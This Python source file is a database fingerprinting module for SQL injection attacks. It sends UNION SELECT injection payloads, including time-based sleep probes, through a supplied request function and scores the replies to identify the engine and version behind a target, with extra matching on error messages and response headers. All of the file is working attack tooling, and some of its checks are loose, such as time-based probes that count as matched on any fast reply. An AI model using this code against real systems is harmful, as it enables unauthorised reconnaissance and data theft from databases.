"""
Advanced DBMS Fingerprinter - Multi-dimensional DBMS identification
Detects 20+ database engines with confidence scoring
"""

import hashlib
import re
import string
import time
from typing import Callable, Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class FingerprintResult:
    dbms: str
    version: str
    confidence: float
    method: str
    evidence: List[str]


class DBFingerprinter:
    def __init__(self, request_func=None):
        self.request = request_func
        self.fingerprints = self._init_fingerprints()
        self.version_patterns = self._init_version_patterns()

    def _init_fingerprints(self) -> Dict[str, List[Dict]]:
        return {
            "MySQL": [
                {"test": "VERSION()", "pattern": r"[\d.]+", "weight": 0.3},
                {"test": "CONNECTION_ID()", "pattern": r"\d+", "weight": 0.1},
                {"test": "SUBSTRING('test',1,1)", "pattern": r"t", "weight": 0.1},
                {"test": "NOW()", "pattern": r"\d{4}-\d{2}-\d{2}", "weight": 0.1},
                {"test": "DATABASE()", "pattern": r"\w+", "weight": 0.1},
                {"test": "SLEEP(0)", "pattern": r"^.{0,10}$", "weight": 0.2, "time_based": True},
            ],
            "MariaDB": [
                {"test": "VERSION()", "pattern": r"Maria|mariadb|10\.", "weight": 0.4},
                {"test": "IF(1=1,SLEEP(0),0)", "pattern": r"^.{0,10}$", "weight": 0.2, "time_based": True},
            ],
            "PostgreSQL": [
                {"test": "current_database()", "pattern": r"\w+", "weight": 0.2},
                {"test": "VERSION()", "pattern": r"PostgreSQL", "weight": 0.4},
                {"test": "pg_sleep(0)", "pattern": r"^.{0,10}$", "weight": 0.2, "time_based": True},
                {"test": "1::int", "pattern": r"1", "weight": 0.1},
                {"test": "string_agg", "pattern": r".+", "weight": 0.05},
            ],
            "MSSQL": [
                {"test": "@@VERSION", "pattern": r"Microsoft SQL Server", "weight": 0.4},
                {"test": "DB_NAME()", "pattern": r"\w+", "weight": 0.15},
                {"test": "NEWID()", "pattern": r"[a-f0-9-]+", "weight": 0.1},
                {"test": "GETDATE()", "pattern": r"\d{4}-\d{2}-\d{2}", "weight": 0.1},
                {"test": "WAITFOR DELAY '0:0:0'", "pattern": r"^.{0,10}$", "weight": 0.2, "time_based": True},
            ],
            "Oracle": [
                {"test": "DUAL", "pattern": r"DUAL|dual", "weight": 0.2},
                {"test": "VERSION FROM v$instance", "pattern": r"\d+\.\d+\.\d+", "weight": 0.3},
                {"test": "USER FROM DUAL", "pattern": r"\w+", "weight": 0.1},
                {"test": "DBMS_LOCK.SLEEP(0)", "pattern": r"^.{0,10}$", "weight": 0.2, "time_based": True},
            ],
            "SQLite": [
                {"test": "sqlite_version()", "pattern": r"[\d.]+", "weight": 0.5},
                {"test": "typeof(1)", "pattern": r"integer", "weight": 0.2},
                {"test": "sqlite_temp", "pattern": r".+", "weight": 0.1},
            ],
            "BigQuery": [
                {"test": "CURRENT_DATETIME()", "pattern": r"\d{4}-\d{2}-\d{2}", "weight": 0.2},
                {"test": "SESSION_USER()", "pattern": r".+@.+", "weight": 0.3},
                {"test": "GENERATE_UUID()", "pattern": r"[a-f0-9-]+", "weight": 0.2},
            ],
            "ClickHouse": [
                {"test": "version()", "pattern": r"\d+\.\d+\.\d+", "weight": 0.4},
                {"test": "now()", "pattern": r"\d{4}-\d{2}-\d{2}", "weight": 0.2},
                {"test": "uptime()", "pattern": r"\d+", "weight": 0.1},
            ],
            "CockroachDB": [
                {"test": "version()", "pattern": r"CockroachDB|cockroach", "weight": 0.5},
                {"test": "current_database()", "pattern": r"\w+", "weight": 0.2},
            ],
            "DuckDB": [
                {"test": "version()", "pattern": r"v[\d.]+", "weight": 0.4},
                {"test": "current_schema()", "pattern": r"\w+", "weight": 0.2},
            ],
            "Firebird": [
                {"test": "RDB$GET_CONTEXT('SYSTEM','ENGINE_VERSION')", "pattern": r"\d+\.\d+", "weight": 0.4},
                {"test": "GEN_ID(GEN_TEST,0)", "pattern": r"\d+", "weight": 0.2},
            ],
            "H2": [
                {"test": "H2VERSION()", "pattern": r"[\d.]+", "weight": 0.5},
                {"test": "CURRENT_TIMESTAMP", "pattern": r"\d{4}-\d{2}-\d{2}", "weight": 0.2},
            ],
            "Snowflake": [
                {"test": "CURRENT_VERSION()", "pattern": r"[\d.]+", "weight": 0.4},
                {"test": "CURRENT_ACCOUNT()", "pattern": r"\w+", "weight": 0.2},
                {"test": "CURRENT_REGION()", "pattern": r"\w+", "weight": 0.1},
            ],
            "Sybase": [
                {"test": "@@VERSION", "pattern": r"Adaptive Server|Sybase", "weight": 0.5},
                {"test": "DB_NAME()", "pattern": r"\w+", "weight": 0.2},
            ],
            "Derby": [
                {"test": "SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTIES()", "pattern": r".+", "weight": 0.3},
                {"test": "CURRENT_ISOLATION", "pattern": r"\w+", "weight": 0.2},
            ],
            "HSQLDB": [
                {"test": "DATABASE()", "pattern": r"\w+", "weight": 0.2},
                {"test": "CURRENT_SCHEMA", "pattern": r"\w+", "weight": 0.2},
            ],
            "NoSQL": [
                {"test": "1=1", "pattern": r".+", "weight": 0.1},
            ],
        }

    def _init_version_patterns(self) -> Dict[str, List[str]]:
        return {
            "MySQL": [r"MySQL", r"(\d+)\.(\d+)\.(\d+)"],
            "MariaDB": [r"MariaDB|mariadb", r"(\d+)\.(\d+)\.(\d+)"],
            "PostgreSQL": [r"PostgreSQL", r"(\d+)\.(\d+)"],
            "MSSQL": [r"Microsoft SQL Server.*?(\d+)\.(\d+)\.(\d+)"],
            "Oracle": [r"Oracle.*?(\d+)[gci]\.(\d+)"],
            "SQLite": [r"SQLite|sqlite", r"(\d+)\.(\d+)"],
            "BigQuery": [r"BigQuery|bigquery"],
            "ClickHouse": [r"ClickHouse|clickhouse", r"(\d+)\.(\d+)\.(\d+)"],
            "CockroachDB": [r"CockroachDB|cockroach", r"v(\d+)\.(\d+)"],
            "DuckDB": [r"DuckDB|duckdb", r"v(\d+)\.(\d+)"],
            "Firebird": [r"Firebird|firebird", r"(\d+)\.(\d+)"],
            "H2": [r"H2|h2", r"(\d+)\.(\d+)"],
            "Snowflake": [r"Snowflake|snowflake"],
            "Sybase": [r"Adaptive Server|Sybase"],
        }

    def fingerprint(self, probe_func: Callable = None) -> FingerprintResult:
        """Multi-dimensional fingerprinting with confidence scoring"""
        scores = {dbms: 0.0 for dbms in self.fingerprints}
        evidence_map = {dbms: [] for dbms in self.fingerprints}

        for dbms, tests in self.fingerprints.items():
            for test in tests:
                try:
                    result = self._run_test(test)
                    if result["matched"]:
                        scores[dbms] += test["weight"]
                        evidence_map[dbms].append(f"{test['test']}: {result['value']}")
                except Exception:
                    continue

        # Find best match
        best_dbms = max(scores, key=scores.get)
        best_score = scores[best_dbms]
        total_possible = sum(t["weight"] for t in self.fingerprints[best_dbms])

        confidence = (best_score / total_possible * 100) if total_possible > 0 else 0

        # Extract version
        version = self._extract_version(evidence_map[best_dbms], best_dbms)

        return FingerprintResult(
            dbms=best_dbms,
            version=version,
            confidence=round(min(confidence, 100), 1),
            method="behavioral_analysis",
            evidence=evidence_map[best_dbms][:5]
        )

    def fingerprint_from_errors(self, error_messages: List[str]) -> FingerprintResult:
        """Fingerprint DBMS from error messages"""
        error_signatures = {
            "MySQL": [r"SQL syntax.*?MySQL", r"mysql_fetch", r"mysqli_", r"Warning.*mysql_"],
            "PostgreSQL": [r"PostgreSQL.*?ERROR", r"psql", r"PG::"],
            "MSSQL": [r"Microsoft OLE DB.*?SQL Server", r"Unclosed quotation mark", r"SQL Server.*?Error"],
            "Oracle": [r"ORA-\d{5}", r"Oracle.*?driver", r"PL/SQL"],
            "SQLite": [r"SQLite", r"sqlite3.", r"SQL logic error"],
            "Firebird": [r"Firebird", r"isc_"],
            "DB2": [r"DB2", r"IBM SQL"],
        }

        scores = {}
        for error in error_messages:
            for dbms, sigs in error_signatures.items():
                for sig in sigs:
                    if re.search(sig, error, re.I):
                        scores[dbms] = scores.get(dbms, 0) + 1

        if scores:
            best = max(scores, key=scores.get)
            return FingerprintResult(
                dbms=best, version="", confidence=min(scores[best] * 20, 95),
                method="error_analysis", evidence=error_messages
            )

        return FingerprintResult(
            dbms="Unknown", version="", confidence=0,
            method="error_analysis", evidence=[]
        )

    def fingerprint_from_headers(self, headers: Dict[str, str]) -> FingerprintResult:
        """Fingerprint from response headers"""
        header_signatures = {
            "MySQL": [r"X-Powered-By.*MySQL", r"X-DB.*MySQL"],
            "PostgreSQL": [r"X-Powered-By.*PostgreSQL", r"server: postgres"],
            "MSSQL": [r"X-Powered-By.*ASP\.NET", r"X-AspNet"],
            "Oracle": [r"X-Powered-By.*Oracle", r"X-DB.*Oracle"],
        }

        combined = " ".join(f"{k}:{v}" for k, v in (headers or {}).items())
        for dbms, sigs in header_signatures.items():
            for sig in sigs:
                if re.search(sig, combined, re.I):
                    return FingerprintResult(
                        dbms=dbms, version="", confidence=60,
                        method="header_analysis", evidence=[f"Header: {sig}"]
                    )

        return FingerprintResult(
            dbms="Unknown", version="", confidence=0,
            method="header_analysis", evidence=[]
        )

    def deep_fingerprint(self, probe_func: Callable = None,
                         headers: Dict[str, str] = None,
                         errors: List[str] = None) -> List[FingerprintResult]:
        """Comprehensive fingerprinting using all available data"""
        results = []
        results.append(self.fingerprint(probe_func))
        if headers:
            results.append(self.fingerprint_from_headers(headers))
        if errors:
            results.append(self.fingerprint_from_errors(errors))

        # Cross-reference
        if len(results) >= 2:
            primary = results[0]
            for r in results[1:]:
                if r.confidence > primary.confidence and r.dbms != "Unknown":
                    primary = r

            # If header and behavior agree, boost confidence
            dbms_set = set(r.dbms for r in results if r.confidence > 30)
            if len(dbms_set) == 1:
                primary.confidence = min(primary.confidence + 15, 100)

        return results

    def _run_test(self, test: Dict) -> Dict:
        """Run a single fingerprint test"""
        query = test["test"]
        payload = f"' UNION SELECT {query}-- -"

        if test.get("time_based"):
            start = time.time()
            self.request(payload)
            elapsed = time.time() - start
            return {"matched": elapsed < 2, "value": f"{elapsed:.3f}s"}

        response = self.request(payload) if self.request else ""
        pattern = test["pattern"]
        match = re.search(pattern, response, re.I)

        return {
            "matched": bool(match),
            "value": match.group(0) if match else ""
        }

    def _extract_version(self, evidence: List[str], dbms: str) -> str:
        """Extract version string from evidence"""
        patterns = self.version_patterns.get(dbms, [])
        for ev in evidence:
            for pat in patterns:
                match = re.search(pat, ev)
                if match:
                    return match.group(0)
        return ""
